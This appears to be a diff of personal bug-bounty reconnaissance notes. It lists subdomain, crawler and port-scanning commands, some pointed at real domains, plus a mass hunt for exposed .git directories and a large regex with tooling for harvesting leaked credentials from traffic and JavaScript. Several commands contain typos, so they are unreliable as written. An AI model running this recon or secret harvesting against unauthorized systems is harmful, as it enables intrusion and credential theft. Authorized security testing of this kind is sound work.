+          echo “https://tesla.com” | katana
+          katana -u https://tesla.com,https://google.com
+          subfinder -d tesla.com -silent | httpx -silent | katana
+          katana scan -u target.com --header "X-Requested-With: XMLHttpRequest" --header "Accept-Language: en-US,en;q=0.9
+          katana -list urls.txt  -silent -d 6 -rl 25 -jc -f qurl | tee gapkatana.txt   
+          katana scan -u target.com -p xss,sql
+   note : Katana supports multiple default fields such as url, path, fqdn, rdn, rurl, qurl, qpath, file, key, value, kv, dir, udir     https://github.com/projectdiscovery/katana?ref=blog.projectdiscovery.io#-field
+           katana -u https://yahoo.com -f qurl          
+               (No need waybackurls)
+     Example:
+     echo target | katana -passive -f qurl -pss waybackarchive,commoncrawl, alienvault | tee endpoints
+     
+     katana” to list all endpoints matching  regex to fetch only those urls having parameters and values (? And =)
+     katana -u https://redacted.com -fs dn -iqp -mr "\bhttps?:\/\/[^\s]+?\?[^\s]*=[^\s]*\b" -o katna.txt
+     
+     
+                       
+ whatweb -a 3 (url)
+ ping -c 1 (ip)
+fping -g (ip)/24  
+nmap -PEPM -sP -n (ip)/24 
+
+
+   PORT SCANNING 
+   NMAP 
+   nmap (url) -p80, 443 -F -A
+   nmpa (url) --top -ports 2000
+   nmap url -sV
+   nmap url -sV --version -intensity 8
+   nmap url -Sv --version - all
+    
+ check /usr/share/nmap    for SCRIPTS 
+ 
+ nmap url --scripts =http-sql-injection
+  nmap url --scripts =firewall-bypass -sw
+nmap --scripts "discovery,ftp*,ssh*,http-vuln*,mysql-vuln*,imap-*,pop3-* -il ./nmap_input.txt
+masscan -p1-65535 -il  ./dnsprobe_ip.txt -ol ./masscan_output.txt
+
+     NAABU
+    naabu -host url -p8080
+    
+    MAASSCAN
+    masscan ip/24 p80, 443
+    masscan ip/24 --top -ports
+    
+
+Dangerously fast dns/network/port scanner, all-in-one.        check it more  and also not  yet download
+skanuvaty --target nmap.org --concurrency 16 --subdomains-file /usr/share/dnsenum/dns.txt       
+
+
+ theHarvester -d  digitalpacific.com.au -b "anubis, baidu, bing, binaryedge, bingapi, bufferoverun, censys, certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, google, hackertarget, hunter, intelx, linkedin, linkedin_links, n45ht, omnisint, otx, pentesttools, projectdiscovery, qwant, rapiddns, rocketreach, securityTrails, spyse, sublist3r, threatcrowd, threatminer, trello, twitter, urlscan, virustotal, yahoo, zoomeye"
+    
+    
+    CENsYS
+    check for command line tools 
+     check for api-key 
+     python3 censys-subdomain.py (url)
+     Look for SSL certificate:
+    
+    
+    CHAOS  
+    CHECK FOR github to get the api-key to run it
+    
+      tip  tip
+      When you find any cms or any login pannel like phpmyadmin there is always chance for secret files there check out these huge cms wordlist and next time you find any endpoint cms just bruteforce that enpoint  with these wordlist its worth ❤️
+https://github.com/p0dalirius/webapp-wordlists/tree/main
+    
+    
+    
+    
+    
+     TIP    tip    important                            https://medium.com/@red.whisperer/sqli-ssrf-and-code-secrets-all-in-one-a387c734c84f
+    WHENever  Trufflehog browser extension  found any  subdomain holds a .git directory behind it,  use this tool https://github.com/internetwache/GitTools     to dump all the git dirctory
+    
+    
+    tip
+    /.git File Mass Hunting 👇
+
+cat alivesubs.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
+    
+    
+    
+    
+    SOURCE CODE REVIEW TOOLS / AUDITING TOOL
+    https://github.com/wireghoul/graudit
+   
+   
+   
+   tip
+   
+
+     
+       
+ check  ./cruze         //cruze : a script to automate all the lazy recon flow of the hunter with the tools great people have developed.
+ ./cruze.sh example.com
+ 
+ tips  
+ LEAKED CREDENTIALS         https://github.com/h4x0r-dz/Leaked-Credentials/
+ 
+ To search for leaked credentials using Google Chrome's Developer Tools and regex, follow these short steps:
+Open DevTools: In Chrome, navigate to the site you're inspecting, then open Developer Tools with Ctrl+Shift+I (Windows/Linux) or Cmd+Option+I (macOS).
+Go to Network Tab: Click on the "Network" tab.
+Enable Regex Search: Click the regex icon in the filter bar to enable regex mode.
+Refresh Page: Refresh the page to load all network requests.
+Apply Regex: Paste the given regex into the filter bar to search for patterns indicating leaked credentials.
+     
+((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]
+
+then Review Matches: Manually inspect the filtered requests to identify potential leaks.
+
+
+USING BURP
+ To search for leaked credentials in your target's scope using Burp Suite:
+
+Launch Burp Suite: Start Burp Suite and configure your browser to route traffic through it.
+Browse Your Target: Navigate through your target site and its subdomains to capture traffic in Burp Suite.
+Use the Regex in Search:
+Go to the "Burp" > "Search" tab.
+In the search type, choose "Regular expression".
+Paste the following regex:
+  (?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]
 
 
 
+  
+  
+  JAVASCRIPT-FILE-FOR-BUG-HUNTERS
+  Manual Checking JavaScript:
+  
+   developer tools, --> HTML source code. Look for JavaScript references within the HTML file, which are often included using <script> tags. You can click on these references to view the JavaScript code  0r network tab-- > sourc file  --> open 
+   
+ ***  Make sure you set up your burp proxy and keep it running in background. Take a deep dive into your target, thoroughly examining all its features and endpoints. Once you’re done, head over to the proxy tab and configure the filters as shown below to capture all the JavaScript files which are  scripts, shown only in scope items, and shown only js . Don’t forget to copy all the results and save them in a file called “link.txt”.   then run 
+            wget -P jsfiles -i link.txt    
+            all keywords manually “api key, api_key, password, secret, token, access, pwd, url, config, aws, s3” etc.  check and use the below regex
+         regix =  https://github.com/l4yton/RegHex
+         validate keys =  https://github.com/streaak/keyhacks
+         https://github.com/dirtycoder0124/formcrawler   ----> This script Crawls the website and finds the URLs that contain html forms.
+  
+  with tools
+  cat target.txt | gau | grep ".js" | tee js.txt
+cat target.txt | waybackurls | grep ".js" | tee -a js.txt
+cat target.txt | subjs | httpx -mc 200 | tee -a js.txt
+cat js.txt | Mantra
+cat js.txt | while read url;do python3 SecretFinder.py -i $url -o cli ; done > endpoint
+nuclei -l js.txt -t /root/nuclei-templates/http/exposures/ -o js_bugs.txt
 
+bash JSFScan.sh -l target -all -r -o result.ru
+
+  
+ 
+ pip install jsbeautifier. Then, you run it with js-beautify -o outfile.txt scripts.txt. This will output the file outfile.txt which you can easily browse through.
+ 
+ Now that we have a readable version of all the JavaScript code in one place, I like to start with Grep to get a feel of what I am expecting. The general command is grep --color -i term outfile.txt. You just change the word term with what you’re looking for. For example, try words like secret, admin, password or token to find hardcoded secrets. Alternatively, you can use a path prefix to look for endpoints. Say you noticed that all API endpoints start with /api/v1. In this case, you can substitute the word term in the grep command with /api/v1 to collect all the API endpoints.
+ 
+ 
+ onliner to extract endpoints from JS files of a given host
+ ./js at my kali/scan/
+ 
+
+
+     
+                                                  
+keywords to look for  in javascript files:pathname url:, POST, api, GET, setRequestHeader, send( (yes with just one (, as it's used when making Ajax requests!. .headers, onreadystatechange, var {xyz} = , getParameter(), parameter, .theirdomain.com, apiKey. and also postMessage, messageListener, .innerHTML, document.write(, document.cookie, location.href, redirectUrl, window.hash.
+
+
+ getting javasacript files
+ source code/developers tools -> search for .js , then copy and paste in vscode and search for all ** word 
 
     waybackmachine
 ttps://web.archive.org/web/*/facebook.com/*
